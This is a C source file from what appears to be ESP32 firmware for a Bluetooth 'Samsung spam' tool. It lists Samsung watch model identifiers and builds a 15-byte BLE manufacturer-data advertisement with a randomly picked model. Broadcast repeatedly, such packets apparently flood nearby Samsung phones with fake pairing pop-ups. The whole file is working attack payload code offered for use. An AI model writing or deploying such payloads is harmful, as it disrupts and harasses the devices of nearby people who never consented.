// Copyright (c) 2025 HIGH CODE LLC
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

#include "samsung_spam.h"

#include <string.h>

#include "esp_random.h"

static const char *TAG = "SAMSUNG_SPAM";

#define SAMSUNG_PAYLOAD_SIZE 15

typedef struct {
  uint8_t value;
} samsung_spam_watch_model_t;

static const samsung_spam_watch_model_t WATCH_MODELS[] = {
    {0x1A}, {0x01}, {0x02}, {0x03}, {0x04}, {0x05}, {0x06}, {0x07}, {0x08},
    {0x09}, {0x0A}, {0x0B}, {0x0C}, {0x11}, {0x12}, {0x13}, {0x14}, {0x15},
    {0x16}, {0x17}, {0x18}, {0x1B}, {0x1C}, {0x1D}, {0x1E}, {0x20}};
#define WATCH_MODELS_COUNT (sizeof(WATCH_MODELS) / sizeof(WATCH_MODELS[0]))

int generate_samsung_payload(uint8_t *buffer, size_t max_len) {
  if (buffer == NULL)
    return 0;

  uint8_t model = WATCH_MODELS[esp_random() % WATCH_MODELS_COUNT].value;
  uint8_t packet[SAMSUNG_PAYLOAD_SIZE] = {0x0F,
                                          0xFF,
                                          0x75,
                                          0x00,
                                          0x01,
                                          0x00,
                                          0x02,
                                          0x00,
                                          0x01,
                                          0x01,
                                          0xFF,
                                          0x00,
                                          0x00,
                                          0x43,
                                          (uint8_t)((model >> 0x00) & 0xFF)};
  if (max_len < SAMSUNG_PAYLOAD_SIZE)
    return 0;
  memcpy(buffer, packet, SAMSUNG_PAYLOAD_SIZE);
  return SAMSUNG_PAYLOAD_SIZE;
}
